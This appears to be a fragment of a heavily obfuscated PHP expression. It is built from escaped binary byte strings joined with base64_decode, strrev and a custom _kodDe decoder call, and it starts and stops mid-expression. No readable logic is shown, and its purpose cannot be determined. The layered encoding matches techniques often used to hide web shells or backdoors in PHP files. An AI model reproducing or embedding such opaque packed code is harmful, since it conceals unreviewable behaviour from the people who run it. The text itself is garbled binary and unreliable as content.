b\x7f"."\376\316\241\317\157\72\353\231\307\166\136\323\367\371\7\173\126\357\374\142\343\307\377\170\153\342\332\153\177\370\331\347\217\75\377\327\377\172\277\357\376\57\336\376\174\142\371\123\313\307\207\76\370"."\xa3\xea\x53\x1f\xb8\xf7\xf3\x7f\xfa\x8f\xfc\xe4\xf4\x7f\xfd\xe0\x83\xd3\x96\x7f\xf2\xc1\xc9\x2f\x7f\x11\xfe\xc3\xf\x37\xbe\xf3\xc7\x6d\xe7\xd4\x3e\x7a\xc8\x78\xaa\xaf\xfd\xe8\xa7\x9e\xb8\xeb\xf0\xe9\x6f\x79\xb4".base64_decode('0++/yZO5/YBDV1518jcD/3Xl0Mkn13/j+l3f/n5s67u7CksGf9N6+Yvpuucvn3PIkc9sP+g=')."\xa7\xaf\x37\x87\xab\x76\x3d\xf4\xe7\xeb\x3d\xc7\xce\x9e\xa8\x3d\xe2\x95\xb9\xb7\xfc\xc7\xd\xbf\xdd\x3d\x67\xf0\x82\xff\xca\xdf\xf2\xf6\x8d\xdb\xdb\x77\x6f\x79\xe3\x1f\x7f\xb9\xe4\xae\xe7\xff\x79\xff\xbd\xab\xbc".strrev('ğ|8¿øè}}ç\'Àã"å|Ú/Âó»½¤½?ÓcÓp~˜më3—ÑÆuü¿÷·Ş÷Ã\'k').base64_decode('2jsOGHh8xXNVx9Xsr6UfHn48dPZHre+2X9q9c+Huo+Pe/14ayazzT//s6mP/siL90I/Ob6w=')."\76\41\320\374\347\324\156\363\263\303\252\227\371\256\115\376\353\213\247\37\273\105\131\272\366\300\135\57\256\176\371\267\107\177\364\363\271\213\33\217\273\143\274\163\360\240\323\176\26\170\357\262\301"."\x6f\xfe\xf5\xb4\xfb\x63\x7\x3d\xf5\xd4\xf9\x77\x5d\xd7\xf3\xd6\x53\xd3\x5e\x7a\xf7\xfe\x3b\x7e\xf7\xe3\xb9\x97\x67\x3f\xbe\xea\xdd\x13\x76\x5d\x33\xa3\x64\x5f\x7e\xc3\x13\x7f\xff\xe8\xe8\x74\xc3\xd5\x1d\x1b\x97".base64_decode('3PXAe8+/3X3g3IuXLB4xR5I3pZ856bLX7vj4qT+9fcLP1h312DUxLXHp4223h7XqR797UZM=')."\365\351\351\167\255\334\366\361\326\53\156\375\365\47\317\34\166\151\360\362\33\126\254\331\151\136\173\162\374\365\73\26\136\337\246\117\14\157\55\150\37\367\235\350\177\154\350\375\17\56\270\160\346".base64_decode('+Fmn+3fMWPXpjfPPWPbVn8SOvPDq23cdsvgrLY9e89i6zS9cePj4tJaHDjs19cSrDycmIk8=')."\34\373\336\255\257\304\225\243\217\131\76\377\202\67\76\134\344\33\174\362\300\223\26\177\153\64\236\171\72\273\353\230\47\247\57\134\273\353\350\247\153\206\317\74\76\363\233\171\147\34\266\365\376"."\330\241\267\355\175\272\157\306\300\374\37\267\45\76\371\307\267\16\336\364\303\227\156\337\266\175\321\277\355\352\113\355\376\372\257\267\177\276\165\106\307\312\21\357\211\357\30\167\335\375\333\377\74"."\xef\xfa\x3f\x87\x86\x9e\x99\x7e\xef\xdb\x37\x9d\x3c\xd1\xb6\x70\xfb\x7f\xb4\x4e\x7b\x6a\xe9\xa3\xd3\x43\xaf\x5d\x71\xd8\x77\xae\x3a\xe4\x5b\x3f\xf9\xd9\x75\xfb\xfb\x56\x58\xaf\xfd\xed\x8e\x77\x6e\x79\xfb\xf8\x19"."\125\33\136\76\364\371\145\255\267\37\222\156\114\347\137\135\163\360\151\57\257\132\166\376\63\323\326\377\331\67\75\365\226\357\311\13\57\72\172\336\105\103\271\347\307\257\270\352\264\255\77\37\172"."\xe2\xc6\x81\xfc\xce\xfa\xcd\xb7\x5e\xbc\xe4\xaf\x7f\xf8\xc3\x23\xca\xde\xd7\x6f\xb8\xe1\xdd\x3f\x9f\xb6\x7d\xd7\x7e\xd3\xfe\x36\xf9\xcc\xab\x27\xfd\x6a\x6e\xe0\xd9\x6f\xbf\x30\xf8\xee\x3f\x1e\x7d\xb6\xcd\x3a\xf7"."\371\335\341\221\147\357\173\377\275\65\167\314\335\357\237\65\337\230\366\330\53\377\334\160\377\235\167\335\373\267\117\156\253\31\372\372\161\257\177\326\376\351\103\167\117\336\173\360\161\153\253\146\376"."\xe3\x77\xb7\x47\xe\xf8\xfc\xa5\x4b\xa7\x7d\x68\x9e\xf9\xef\xb\x8a\x3f\x6b\x7f\xf2\x37\x63\x51\xdf\xb9\xbf\xba\x74\xda\xb5\x3b\x5e\x9e\xf5\x8f\x3f\xef\xd8\xdb\x7a\xef\x57\x2f\xd9\x78\x60\xe0\xf3\xd9\xcf\x7e\xf7"."\xe9\x37\x4a\xa5\xd7\xbe\xff\xc1\x2b\x89\x25\x6f\xae\xed\x39\xe1\x88\xff\xe8\xf9\xf6\x55\xdd\xcb\x2e\xae\x39\xaf\xf1\x9d\xc4\xba\x6d\xf3\x27\x3f\xfc\xf4\x35\xff\x35\x9b\x4b\x1f\xbc\xf4\xf4\xce\x7\x3e\x9f\xf8\xb4"."\115\275\366\137\173\26\356\71\366\337\213\237\176\160\307\271\313\77\377\350\245\243\256\275\146\371\147\15\236\267\126\107\257\125\277\370\353\125\377\375\376\125\313\373\36\330\70\366\351\133\147\356\171".base64_decode('8ItXPq0+tu+H/9z1C/+yz95/cPme0EnP/e3va61nT3to+x3vPX2T9s/7hv7++Evj77779y0=').strrev('íu^7n¾ÏÎúmG1Şu,øÌgü~ŸMÇë×øKå…æ¹^K]ÌÒÚõÛn»Ó›uùç5Û¿')."\xc4\x87\x7f\xdd\xf2\xc6\xe3\x57\xff\xee\x96\xd8\xe4\x7b\xdf\xdc\xf2\xd3\x87\x57\x57\x1d\xf7\xd1\xd3\xd3\x9b\xa3\xaf\xaf\xfd\xe1\xe1\x8f\x27\x5f\xe9\xff\xf5\x8f\x97\xcc\x7e\xe0\xf4\x99\x7\xf4\x3c\xfe\xf8\x29\x81"."\311\206\143\233\27\356\170\355\370\103\237\370\327\1\301\147\367\337\362\225\357\62\233\277\372\6\120\326\134\134\277\230\6\100\262\66\177\36\4\320\326\15\314\153\76\227\355\117\3\267\76\267\201".strrev('ÓNv)Ã#c“ú£Ì-LƒıŠ³°n8[Hr»€[IÃ mÌÃ4°²4ı2¦7‡%û)')."\xcd\x1\x3\x4\x33\xc5\xb1\xd\xe9\x64\x16\xce\x96\xa9\xc1\x4c\xde\xd8\xc0\x54\x6d\xf2\x1b\x4b\x19\x66\x1e\xd5\xb0\x68\x21\x74\x8d\x7d\x26\x63\xe6\x8a\xa3\x1b\x87\x19\x23\x8\xdd\x59\xb4\x8\xbe\x38\xa6\x65\x8a"."\xf9\x61\x90\x96\xcc\x5f\x4\x85\x16\xd4\x41\x20\x65\xf\x19\xa5\x51\x68\x24\x74\x7a\x11\x1b\x9c\x86\xc5\x30\x7c\xb9\xfc\xe8\xd0\xc8\x18\xc\xce\xbc\x45\x30\xc\x73\xd9\x37\xcc\x14\x3a\x2c\xb3\x23\xfb\xc2\x85\x6c".base64_decode('yKHwvAb20YZ5bIjYoGfNAW3UYAUBrn4hDOVIcdCwmKLZXDZTc+fC9xdBM+cthk8u4hO0cDE=')."\x1b\x2e\x48\x49\xf\x25\xb\x9a\x1\x4d\x1c\x1a\x49\x9a\xa3\xb9\x12\x6b\x15\x8c\xcd\x2\x0\x2d\x99\xf9\xd1\x2c\xeb\x6c\xc3\x7c\xd6\x9d\x6\xa8\x32\x3d\x9a\x1f\xda\xc0\xc\x9f\xf4\xb1\xec\x40\x6e\x8\xe4\x90\xf3".base64_decode('66F/ixZDQLfyaMKBs5/LFAvNkbEN2YE06zUMYkbThwbHmFjVSG/sZzoOxXS/PTwAMm17g5U=').base64_decode('TQ8zIcWAttFgxnEL2WzNrYeBTG+0h/IZ6GdudEPaLEBkMRughfUwiMNGdmM+Dd3KDuQ3ppg=')."\xe1\x4e\x3\x9b\xe6\x2c\x6a\xc4\x10\x13\x2\x9a\x1b\xb4\xd1\xdc\x8\x20\xce\xe8\x70\x21\x3b\x60\x43\x8f\x16\xd5\xb1\x1e\xe9\xb6\x55\x48\x31\xd1\x47\x41\x1b\xcd\xe\xc1\x39\x86\x4d\xf0\xc2\x85\xd0\xe4\x85\xec\x1b"."\45\73\155\132\354\270\123\317\72\142\15\157\110\215\144\101\343\244\224\35\31\314\364\303\32\312\153\326\300\230\15\30\264\321\66\207\213\114\336\264\261\70\254\17\62\260\6\206\225\351\215\33\122"."\245\61\146\335\67\220\317\245\306\30\110\35\114\217\235\353\37\311\63\213\340\244\155\242\132\140\204\123\246\66\64\232\3\152\300\26\311\300\320\150\177\56\5\243\142\345\354\324\150\11\246\252\60"."\132\112\246\162\260\244\307\214\334\100\166\210\221\212\6\30\0\173\143\166\310\30\144\322\356\176\164\114\36\206\266\315\235\13\103\323\257\27\207\6\223\320\234\124\76\131\30\51\2\374\360\106\153"."\x43\xae\x8\xa3\x92\x49\xe\xe\x14\xd3\x80\x6a\xf9\xd1\xc1\x31\x23\xb\xd\xcd\xe4\xb2\xc5\x34\xa3\x0\xd\xec\xa4\x88\xa0\xf5\x7e\x13\x26\x47\x2f\x21\x4\xcb\xc1\x7c\x2f\x66\x2b\x62\x31\xa3\x16\x85\xd1\xfe\xa4"._kodDe('KnrBXTMDAYCCzSU8uSRiY6EFeBETl0L1qXvhQD4tMQ5Icnf+i8Wt9YhIB4sz94WEqvEnld21')."\x11\xd6\x3b\x3c\xb0\x25\x98\x9c\x66\x2d\x39\xc8\x30\x8f\x2b\x69\xcb\xba\xcf\x54\xf1\x8d\xa\xeb\xe4\xfb\x1a\x66\x5f\x6a\xe4\x7d\x39\x2d\xcf\x95\x8e\xda\x1\x63\xe4\xb4\x41\x5d\x67\xa6\x8\x30\x72\xb6\x50\x5f\x1"."\xb5\x6b\x48\x37\x72\xba\x10\xa9\xd3\x8b\xb\x56\x52\x1c\xf4\xb1\x94\x45\x52\x80\xc1\xd1\xb8\x5c\x4b\x32\x6f\x4b\xd9\x28\xe6\xc8\x8d\xcb\xd6\x12\xd0\x3b\xdc\x42\x9f\xdc\xeb\xb5\x39\xa6\x95\x5e\xe1\x7e\x14\x64\xc1"."\362\345\327\240\231\112\146\315\122\312\121\153\252\337\127\141\44\151\117\52\345\14\270\323\271\302\124\277\64\113\242\162\207\31\0\113\163\214\40\55\7\312\72\155\272\255\244\372\251\21\271\305\124"."\254\150\226\112\376\100\367\250\101\265\205\165\364\271\15\40\273\145\163\352\257\320\352\175\154\126\351\125\202\255\131\203\76\271\301\136\71\327\310\243\16\146\263\76\247\261\75\266\172\357\356\122\23"."\x81\xf8\x4a\x49\x4d\x12\x5b\x65\x3b\x3e\x5f\xd6\x59\x31\xcb\xd2\x90\xcb\x93\xed\x1c\x18\x86\x4c\x7b\x77\xee\x9e\xb8\xe0\xd2\xc9\x4b\x6e\x9d\xdc\xba\x63\xe2\xde\x8b\xf7\xee\xb8\x75\xe2\xfe\x4b\x50\xf4\xcd\x7b\xce"."\237\330\161\315\133\127\154\171\363\236\255\157\336\163\362\336\63\357\174\377\276\363\46\56\330\271\367\264\373\47\266\337\74\361\223\63\337\334\175\377\336\7\317\334\163\363\271\157\336\163\313\344\366"."\xb3\x27\xb6\xdc\xfd\xe6\xee\x4b\x27\xce\xba\x6e\xe2\xcc\xb\x26\x2f\xde\xfa\xe6\xfd\xdb\x11\xfc\xe4\x59\xa2\x66\x4\x36\x71\xcb\xe5\xb8\xec\x7d\xa7\x4e\xdc\x73\xcf\xde\xeb\x6f\xe6\xb9\xef\xdf\x77\xa\x2c\xee\x8c"."\230\236\370\211\21\66\61\4\203\225\145\12\340\256\156\371\224\256\254\216\106\114\41\212\77\130\121\316\316\350\105\305\46\12\163\32\372\233\67\363\136\212\233\154\216\215\74\316\126\330\130\373\70"."\376\46\364\134\1\143\41\214\222\237\132\15\13\213\223\40\21\141\52\375\332\240\102\57\12\150\253\174\302\322\235\230\247\132\302\347\203\207\65\13\313\362\225\202\136\314\31\26\126\237\126\314\1".strrev('ãbÜqÎM±O§ìò ¨Õ0PĞS(°Rmk¡0)3ÆTFiiP…Îm†›à¥!l')."\x4e\xc6\xc\xba\x45\x7b\x5b\x71\xd9\x56\xc4\x2e\xde\x5e\x86\x61\x69\x7e\xe3\x20\x4\xe1\xd0\x3\xc9\xa2\x89\xde\x36\x95\x61\x36\xa1\x3\x4e\x22\xe6\xa0\x10\x4e\xf2\x27\x67\x39\x87\xc\x24\xd5\x44\x15\xc3\xa3\xd0"."\246\170\310\114\170\24\247\225\76\126\255\140\352\12\270\57\142\136\175\12\315\7\165\37\132\274\261\274\163\105\275\220\345\327\156\101\263\60\106\47\3\220\131\236\6\127\47\343\25\6\224\167\323".strrev('tW¨Æn“îÚõÌtÁ”õûèKuæÈTi“D$ÔL9qi`Ì7#,»('."\0".'®ÉG‰‘').base64_decode('T6L1WXRc+i1dXsgU8EDaS5aDxQgzdZTaAGFhsSenZt0XiXw1tzRLrkkwWKPX65UE3kKJD4c=')."\x54\xd6\x31\x62\x7a\x15\xcf\x94\x6c\xac\xab\xd2\x96\x35\xfb\x19\x22\x89\x5b\x7a\x4\x1e\xc2\x13\x37\x55\x7a\xb\xd7\x6d\x41\xe4\x29\x9d\x46\xf5\x35\x12\x13\x69\x65\x8e\x82\xfa\xb0\xc8\x57\x8f\x2\x64\x85\xcd\xf7"."\55\104\101\62\230\260\232\172\141\200\21\103\6\272\121\263\174\363\200\331\265\226\0\201\130\102\320\246\111\352\31\244\213\122\245\174\226\245\242\40\2\211\225\362\30\21\32\235\303\241\347\123\122".base64_decode('oSVa0pZqVQdgvH1iqLQ5Il9PgaWnXxrAEQBgZTuc6IH67+UYg2Ye7ZYpSiZh54MqLcmbREw=')."\x20\x1b\x2e\x4e\x86\x6b\x1f\x45\x6d\x19\x1b\xa\x68\x47\xce\x73\xd\x66\x2b\xab\xb1\xbb\x5a\xb\x1b\x8\xe5\x75\x8e\x9a\x25\x4b\x36\xe2\xd0\xc5\xfa\xc7\xba\xff\x2a\x62\x5e\x2c\x81\xd4\x6a\xca\x0\xd0\x48\xb8\x59"."\155\11\307\104\71\265\120\162\153\261\312\176\176\2\135\141\65\36\217\112\72\255\140\41\265\62\332\242\6\243\321\225\141\300\327\106\211\2\143\333\130\161\251\217\143\302\106\26\337\157\311\372\176"."\62\323\205\75\260\140\156\41\256\200\342\56\132\21\301\366\100\214\33\116\314\367\325\371\352\5\54\372\240\212\55\106\232\230\133\207\170\42\20\253\340\207\207\372\347\201\271\1\237\74\120\240\75".strrev('Üéh †Î<âlL—®‹2ˆ™Ü%!‚ŠêT6yOKÌÙ¢|¥Fw¦†~êqİ#F	Zº')."\13\17\224\247\21\331\36\113\256\221\327\4\330\334\343\251\356\255\352\235\335\133\323\133\273\336\327\153\365\1\111\42\63\142\310\323\3\221\256\26\350\136\43\17\245\54\130\307\35\161\264\167\322".base64_decode('YDQWCEZYU5oDcQhGg2Ea2LPttjfvPX/PVTsmzt6KKpq88tTJy+5GnBbmrnact+eB8ye37Zw=')."\x3c\xf\xb8\x22\x65\xef\xce\x5d\x6f\xde\xff\xe0\x9e\x6d\x37\x4f\xec\xb8\x7c\xf2\xd2\x5f\xed\xb9\xf2\x74\x9a\xf1\xd6\xcf\x6e\x9b\x38\xe7\x66\xde\x30\xe5\xad\x8b\x1f\x98\x3c\xff\x46\xce\x71\x51\x46\xcb\x83\x4a\xbf"."\265\145\353\236\373\167\140\176\353\206\223\47\357\72\167\162\373\326\211\163\256\237\270\342\346\75\347\357\234\370\361\151\23\147\154\335\273\363\222\343\334\210\104\343\75\154\52\300\132\337\177\22\366".base64_decode('tECHt9eag4e2Fv3WYHMa9MusAoh++Indoc5gyG2QJkfBhdFsiiFU5QiYbQtcILE4cXnSVD0=')."\145\53\306\141\376\245\106\111\215\151\11\305\203\261\160\163\10\14\66\370\104\315\42\254\16\150\215\240\324\170\154\25\17\163\373\345\62\227\123\112\15\103\346\132\305\321\21\315\227\64\263\245\134"."\236\64\126\251\302\372\157\125\36\274\113\21\353\70\245\12\357\270\50\101\307\376\31\152\260\103\32\242\105\135\275\266\332\123\347\251\257\125\300\37\25\55\1\136\250\224\52\260\26\340\345\34\37"."\xf1\xf4\x3b\x62\xf5\x9e\xba\x5a\xa5\xaa\x30\x58\x5\xed\x12\xe3\x8a\x5a\xaf\x52\x48\x4b\xd1\x3c\x35\xd0\x60\xb9\xb9\x2\x16\x91\x31\xcb\x2e\x6a\x6\xa2\x6b\x4a\xd2\xc3\x93\x78\x79\xf4\xeb\xf0\x2c\x95\xf4\x89\x12".base64_decode('dJ4QhDtNCXS2OCGpQ6quaqLLmvTZ3LMNm+bqWqUfzGAqZJJijsFocgxGzRygE11tfL6pjYs=').strrev('œÏÚC9EVñB±\'ÎœA›xD&¼ 6ÁÏ'."\0".'£Â‡&º‰¬¶t©Â©’¤M‹4³iB').strrev('wp‚`¹tpü"ÅNª rÏõO4%Ç–)ÛJ¾l1Ÿ¸¹õÌ¸`}å¬t.Ü¤f•')."\142\333\136\152\266\30\17\266\207\72\2\76\40\342\24\23\50\74\346\305\224\46\245\32\123\76\232\124\355\30\176\362\41\66\144\11\362\125\264\256\124\33\161\117\164\24\12\151\150\14\314\276\102"."\374\107\150\244\110\123\65\365\370\3\125\162\207\170\321\130\102\105\3\0\344\131\242\272\325\322\156\41\151\334\143\133\274\141\306\360\15\40\166\310\144\276\213\122\375\314\157\36\252\34\327\31\214"."\x76\xb6\x86\x99\x85\x66\x4b\x3f\xd4\x97\x32\x1d\x40\x2d\xb1\x30\x76\xe8\x2\xdf\x57\x58\x55\x92\x5d\x2c\x8a\x8\x1d\x15\x14\x29\x8c\xa4\x78\x58\x38\xc5\xc0\x19\x7c\xcf\x47\x11\xb1\xe5\xa3\x8\xdf\x6c\x30\x94\xe4"."\340\17\177\77\336\311\303\202\31\106\221\356\70\263\316\301\324\167\165\13\17\267\163\73\166\234\21\215\111\221\100\54\320\21\347\321\330\152\156\355\303\323\250\325\217\332\331\335\41\50\176\44\260"."\12\41\113\224\215\67\73\255\370\117\252\361\315\136\136\333\113\115\52\151\220\376\254\140\61\154\146\326\267\251\336\243\54\330\134\13\60\334\23\212\235\61\362\214\345\304\137\71\61\242\106\242\155".base64_decode('NE4cD4byKXF2UXoUxP8mBP9rsa2LrwYF4bBCLbOVzujqgPBlJ2VAinBt5z+pp3ek14eYBWs=')."\275\60\221\154\151\126\30\33\102\174\342\300\61\17\112\7\330\66\272\336\3\73\206\232\65\323\114\350\215\10\342\70\260\13\364\167\15\13\20\132\11\5\222\304\352\176\224\67\42\340\135\247\366"."\x8e\xf7\x1e\xdf\xeb\xf5\x51\xbb\x54\xcc\xbc\xf4\x7a\x44\x93\xd4\xd0\x1a\xb4\xc7\xc6\xe3\xe\xa3\x5a\x35\x87\x8d\xf6\xa1\x76\xd4\x4b\x8\xd1\x55\x4b\x23\x4b\xe1\x7\x4e\x67\x4b\xe1\x78\x0\xd1\x65\x4d\x7c\x32\x43"."\47\216\167\242\277\155\211\361\20\372\33\101\77\221\4\232\56\203\3\240\45\31\11\257\14\215\343\177\104\106\55\37\110\152\164\346\54\20\356\34\107\377\42\2\63\36\356\164\127\326\34\112\254"."\xe\x85\x28\x0\xb\xc3\xaf\x0\x45\x4\x7\xba\x2a\x39\xa6\xc4\x76\x16\x90\x2d\xec\x2e\xa0\x6a\x55\xad\x21\x83\xe9\xed\x9b\x53\xab\xaa\x7e\xab\x1b\xf0\x85\xfb\x73\xa9\xa9\x9e\x59\x5f\xd\x7b\x48\x20\x1e\x1c\xe7".base64_decode('1NeBEOW4QKwinIjA3S1CvC0W7e6S4u2BVeHONhbzM+sBZTZUrbSE42iIggwZhRdIOU7DlC0=')."\222\271\136\7\112\267\40\312\216\42\22\313\216\17\3\224\62\73\127\131\163\167\70\322\42\173\16\300\200\64\64\213\120\165\330\123\146\261\306\261\70\361\41\300\42\170\310\131\230\240\33\213\220"."\x31\x60\x11\x3a\x0\x2c\x46\x86\x8b\x45\x88\xb7\x49\x16\x21\x1d\x65\x11\x7c\x3a\x9\x75\xb2\x3c\x74\x54\x44\xc7\x3c\x76\xfe\xcb\x68\xc3\xdc\x10\x76\x49\xaa\x5f\x72\xf6\x82\x69\xb0\x8f\x8a\xf9\xb0\x37\x20\x74\x7c"."\xd3\xb8\x70\xd7\x25\x99\x25\xd2\x2c\xe9\xfc\x4f\xf5\x19\x15\xc9\x2\x1f\x8b\x78\x25\x9\x94\x9f\x42\x20\xe6\x93\xc0\xa0\xdf\xde\xf5\xcb\x9\x73\xbc\x9e\xe1\x29\xb5\x1\xb7\x13\x86\x9d\x75\x7c\x14\x2c\x44\xd1\x47".base64_decode('w8RAV/osM1QhEk3VlATwZN+WE4TwikrrQfwsJD9YrZMIpmnUeaLiZGo9PyiB9w8P/EKLDqM=')."\x3f\xbd\x10\x65\xa2\x8c\x5e\xf8\x48\xb5\x7\x36\xdd\x5e\xc6\xb0\xf7\xf4\x8e\xd6\xd5\x79\xd1\x3f\x8b\xd0\xdf\x66\xf4\x37\x88\xfe\x86\x70\x42\x6b\xef\xe8\xc2\x56\x14\x58\xdc\xda\xe7\x87\xb\xa4\xde\xde\xaa\xa9\x86"."\23\0\330\240\102\264\212\106\131\51\30\151\264\107\46\63\330\333\220\152\347\230\344\237\34\346\204\64\235\112\370\105\274\45\26\355\242\34\213\22\156\125\250\363\15\245\232\336\11\124\3\53\26"."\x8c\x85\xf0\x6a\xa2\x50\x2c\xaf\xa6\xda\x21\xe0\x5a\x56\xad\x80\x5d\x7e\xad\xb3\x54\xb8\xb3\x25\xb4\x46\xa9\x36\x52\xa3\xaa\xa6\xa9\x50\x58\x41\x6b\x97\x55\xa4\x94\xd5\xc4\x6a\xa0\x6d\x85\x3b\x4c\x2b\x63\x8e\x28"."\62\72\262\363\65\310\253\23\2\105\313\130\71\342\106\203\131\76\173\340\20\317\163\50\7\115\263\302\161\264\301\107\42\244\247\50\313\260\60\343\353\121\270\267\13\234\210\17\53\124\234\12\25".base64_decode('sQxaEc0KrUnEAjiRcKvTDkF/CAHCp6liTqPWtoTH860HocJ6B0tJmU3MVAKGkS1S6hPPIZI=').strrev('¨È qßçFEÇt‡e«Q:'."\n".'Kuaˆ‹…u™¨–™ÄÈakbwÖ4ép%aÜ²Ì:').base64_decode('NTRYhWeeBsGZsMqtzpnQpQbwuMrDAszzB7E7YwKuHCJRPCZmDXAfZkXOlS3nhLdjvKniSYY=').base64_decode('BRBqDXRH5BQYKmVlaO0+1ghraaU1wvKY+EbcZfGxgJ7VzIeeUiclNQ3oNFvKY688TKgobOQ=').strrev('p¶Î¡X¥Ï/6êTÁ›t}é[¸Œ(0^Ò/¬¢=á®ÑU; XÓ¶±'."\n".'Ï˜i¬V¸e±‡')."\147\250\11\333\337\43\136\201\65\27\344\164\330\315\352\42\250\47\34\125\43\210\277\126\145\121\134\70\12\162\143\207\17\117\125\25\316\156\174\232\320\223\267\213\45\311\5\242\141\22\235\364\16".strrev('¹Õ.Íãqxı\'.„­Ü|u\\%9Lâ6a®UË¼ úŞZ\\~¥y&Û.Ë„²è”B¾n')."\xb\x45\x28\xd0\x2d\xb9\xac\x20\x17\x34\xec\x83\xe4\x6\x29\xef\x6e\x1e\xb6\x55\xef\x60\x1e\x85\xd0\xde\x9b\x65\x2e\xd7\x54\x5d\x74\x2e\xa7\x5b\x16\xbf\x8\x4f\x64\x74\xc5\x2a\xe8\x49\xe2\xaa\x55\x1\x8f\x82\x4a".base64_decode('ypTv+GAqyBGMBe2M8PUh+zhuaYapcppy57DtYFzPgsS/pZ+YKQhbRGHpJZkvkBrEvFLPja4=').strrev('ø	<œ¼¦×œ'."\n".'¡C°B×®t_‹³y‘¼£·İ>Û‚¹1öuB¾1ÇÂ#%œ˜SP‚')."\266\262\14\22\273\70\331\327\14\63\147\141\244\145\222\41\52\216\2\46\341\33\136\311\106\247\224\107\37\361\312\126\137\10\263\110\242\144\147\302\334\134\322\330\102\320\76\101\330\13\201\64\244"."\260\337\42\313\361\11\227\110\244\116\314\171\171\205\143\222\224\46\333\346\112\17\5\34\47\43\16\231\162\201\371\3\206\354\245\304\47\334\104\363\305\264\202\117\24\66\151\367\62\204\103\330\245".base64_decode('Sm3p4vDCQSwdDWkaSAINkuWvNIpGtBt4OYxJuCOl8lUGTqojJrDf2FBGt8GHm4N6haNQ1qc=')."\x63\xab\x33\x6a\x3\x14\xe2\x4e\x3d\x51\x41\xea\x7a\xef\xcb\xb\x75\x4b\x7e\xba\xa7\x20\x38\x15\xcb\x5\x1\x90\x7f\xb0\x48\x4\x53\x5f\xfe\xc1\x98\x2e\xf8\x5\x54\x8c\x18\xf9\x7d\x69\x21\x41\x80\xc9\x97\x48\x21".strrev('aKï@¯¢åÃ†¶±?I[q¬ş á+gc(£6Ú¨ÎŠv†8Èó0I¤tÊ»h‰')."\xb2\x37\x21\xba\xce\x43\x4c\x1d\x6\xdc\xc0\x9\x36\x22\x40\x7f\xd6\xe6\x52\x5e\xd4\x70\xc0\xba\x94\x6e\x73\x67\x5c\xc4\x7c\x55\x72\x15\x26\xd9\xaa\xe7\x38\xbd\x1d\x91\x3c\xf1\x6a\xc3\x3a\xb6\xe9\x63\xa2\x9b\x32"."\205\43\350\112\171\347\240\211\370\156\55\36\355\216\261\173\40\34\307\362\57\65\26\12\256\345\127\62\74\265\65\260\312\235\22\306\362\313\100\133\305\144\56\125\303\351\344\370\252\306\242\130\374".base64_decode('GIq0ugrE27lTZ2eaGgl3rqyYgdiVDqkITQwnQh3uNGcN8VAgxjyO43hzJBqUssPR8pHg/BA=')."\117\244\302\113\232\350\77\251\246\167\23\71\117\65\242\143\125\152\34\113\71\274\152\337\234\332\345\275\233\153\153\172\375\313\175\263\271\160\216\222\53\311\46\172\212\144\213\155\76\215\356\4\274"."\x6f\xb1\x44\x5a\xc\x62\x7e\x9f\xf\x3e\xc2\x3\xfe\x5e\x3f\xf3\xf8\xe6\x17\x99\xf0\x2b\xe0\x67\x8c\x3b\xf7\x18\xf0\xf0\x1f\xa7\xee\xb3\x1c\xd\x75\xb9\x6e\x61\xce\x10\x7c\x6e\xc3\x3b\x95\x59\xdb\x41\x14\x5b\x5f"."\253\174\5\342\53\136\65\276\66\316\347\312\231\346\300\110\212\323\262\162\206\13\30\375\355\222\101\261\202\122\105\100\7\112\73\154\321\345\44\237\141\212\325\42\226\165\312\114\226\260\303\56\61"."\x47\xc2\x72\x1d\x25\xf9\xe4\x2a\xe4\x5\x68\x98\xc0\x4d\x30\x43\x62\x62\x5a\xf\x4b\x1f\x4b\x23\x20\xe8\x36\xe5\x17\x3b\x33\x8d\xb6\x38\xda\x88\x76\x8c\x41\x21\xa2\x80\xaf\xc6\x19\x79\xc8\xa3\xcd\x18\x76\xfb\x20".strrev('DòKÌ¿-Ò|*ÿW½3ğ\\t~Ê&^(V_Y¯V«İÅŒN»FttŒ¬\'ÃÚÛšb').base64_decode('NIjY9zVz0kflKDwXkyd/5Sxamz+Xt+ungOjC+rCmPUXuqo59VwyZPb1WH18GKX2YdVoHDWI=')."\241\113\150\211\343\40\260\63\136\371\75\13\274\56\144\106\65\325\357\342\73\40\101\170\322\222\270\23\221\310\335\240\323\350\230\56\124\66\315\21\311\215\70\133\236\250\70\360\154\340\326\270\15"."\x7b\xf1\x65\x5e\x7b\x87\x88\x13\x56\xb7\x7\xd7\x21\xaf\x36\xe8\xc8\x17\xae\xc5\x87\xbc\xe8\x0\xed\x88\xbb\xbc\xb8\x1e\x4f\xf6\x9a\xe\x33\x5d\x6c\xf0\xdb\xb8\x9d\x79\xb4\x3f\x41\x5b\x80\x63\x91\x97\x23\xd9\xb3"."\270\36\23\336\31\333\135\304\200\47\162\47\52\161\242\251\332\250\314\203\367\41\132\21\157\237\122\172\50\273\16\327\17\230\325\43\117\34\320\250\107\21\256\327\231\340\330\351\123\235\255\107\274"."\252\44\23\346\244\354\102\203\121\367\334\240\120\235\313\15\162\235\225\244\203\273\301\214\104\253\244\141\47\30\30\170\304\5\345\65\217\261\245\11\206\301\315\143\61\351\171\52\207\373\22\371\331".base64_decode('G61QCGZwHxxr2JGUlCMDWNNG1tdxOnZH2S2Ui0xxeEuEuKf2AcmHe1kNiOPMh5gPhLJcxJ4=')."\32\42\173\337\155\351\40\303\313\201\35\112\221\320\100\77\126\70\0\204\33\365\232\226\345\55\24\115\254\261\327\144\344\322\176\153\4\362\262\232\145\257\162\170\235\372\122\347\355\330\173\112\7"."\xe7\xd7\xa1\x9\xa3\x5e\x82\xd5\xec\x23\x50\x14\x27\xf9\x8b\x44\xa3\xc9\x33\x2\xfb\x93\x87\xb8\x6e\x55\xeb\x18\xc2\xf8\x51\xdb\xfc\xd8\xb3\x27\x61\xac\xb9\xa2\x5d\x34\xce\xee\xaa\x9c\xbd\xa7\x2a\x4d\x92\x20\x0".base64_decode('XAq2Mc0i7idduMWmVww0LNxJo/NBII2dyZh59jgTfTZDdqqf0klzuQ8EyR89froFLXWmiyg=')."\x79\xa6\x47\x1c\x27\x33\xa5\x0\x47\xd1\xb2\xc3\x4f\x3c\xe4\xde\x9c\xe3\xc5\x16\x3a\x41\x4e\x7f\xef\x96\xae\xf\x32\xdd\x49\x3c\xdb\x82\xa2\x14\xb9\x5b\x7e\x7a\xf3\xec\xad\x98\xe0\x95\xb4\x21\xe9\x7a\x92\x5e\xf2"."\300\237\3\271\103\206\276\21\2\355\245\77\353\52\265\336\133\24\236\362\321\354\320\27\107\126\352\143\314\243\371\276\235\242\367\266\365\166\364\46\344\356\332\105\155\140\0\65\126\162\345\313\47"."\121\270\306\7\114\42\57\357\260\356\117\355\130\37\256\124\142\264\153\101\174\172\33\305\57\237\10\127\261\335\261\210\343\52\14\100\131\47\66\146\274\101\246\153\